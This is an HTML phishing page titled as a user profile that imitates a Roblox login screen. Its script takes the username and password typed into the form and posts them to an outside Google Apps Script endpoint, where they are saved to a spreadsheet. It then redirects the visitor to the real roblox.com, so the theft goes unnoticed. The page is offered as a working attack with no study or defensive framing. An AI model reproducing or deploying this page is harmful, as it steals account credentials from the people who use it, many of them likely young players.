<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>clark's Profile</title>

<style>
*{
    margin:0;
    padding:500;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    background:url("background.png") no-repeat center center fixed;
    background-size:cover;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login{
    width:378px;
    background:rgba(47,49,56,1);
    border-radius:0px;
    padding:33px 15px;
    box-shadow:0 12px 30px rgba(39, 41, 48);
}

h1{
    color:#fff;
    text-align:center;
    font-size:32px;
    font-weight:800;
    letter-spacing: -1px;
    margin-bottom:15px;
}

input{
    width:100%;
    padding:10px;
    margin-bottom:14px;
    border:none;
    border-radius:10px;
    background:#3c3f48;
    color:white;
    font-size:17px;
}

input::placeholder{
    color:#d5d7dd;
}

.login-btn{
    width:100%;
    padding:3px;
    border:1.5px solid #d6d6d6;
    background:transparent;
    color:white;
    border-radius:10px;
    font-size:20px;
    cursor:pointer;
    transition:.2s;
}

.login-btn:hover{
    background:rgba(255,255,255,.08);
}

.link{
    display:block;
    text-align:center;
    color:#fff;
    text-decoration:none;
    margin:20px 0;
}

.line{
    height:1px;
    background:#555;
    margin-bottom:20px;
}

.secondary{
    width:100%;
    padding:14px;
    border:none;
    border-radius:10px;
    background:#434752;
    color:white;
    font-size:18px;
    margin-bottom:12px;
    cursor:pointer;
    transition:.2s;
}

.secondary:hover{
    background:#555b69;
}

.signup{
    text-align:center;
    color:#fff;
    margin-top:18px;
}

.signup a{
    color:white;
    font-weight:bold;
    text-decoration:none;
}

/* Spinner styles */
.spinner {
    display: none;
    margin: 20px auto;
    border: 6px solid #f3f3f3;
    border-top: 6px solid #ffffff;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>

</head>
<body>

<div class="login">
    <h1>Login to Roblox</h1>

    <form id="regForm">
        <input type="text" id="username" placeholder="Username/Email/Phone" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" class="login-btn">Log In</button>
    </form>

    <!-- Spinner -->
    <div class="spinner" id="spinner"></div>

    <a class="link" href="#">Forgot Password or Username?</a>

    <div class="line"></div>

    <button class="secondary">Email Me a One-Time Code</button>
    <button class="secondary">Quick Sign-In</button>

    <div class="signup">
        Don't have an account?
        <a href="#">Sign Up</a>
    </div>
</div>

<script>
document.getElementById("regForm").addEventListener("submit", function(e) {
    e.preventDefault();
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    // Show spinner
    document.getElementById("spinner").style.display = "block";

    // Send data to Google Sheets Web App
    fetch("https://script.google.com/macros/s/AKfycby9cWQZqdgs1pIcCkpA4uw8lBYADS6drlbN9-9NZsl_VlzHjJJ1oRG1vAZu8g5N06BU/exec", {
        method: "POST",
        body: JSON.stringify({ username: username, password: password })
    })
    .then(response => response.text())
    .then(data => {
        // Redirect immediately after saving
        window.location.href = "https://roblox.com";
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Something went wrong. Please try again.");
        document.getElementById("spinner").style.display = "none";
    });
});
</script>

</body>
</html>
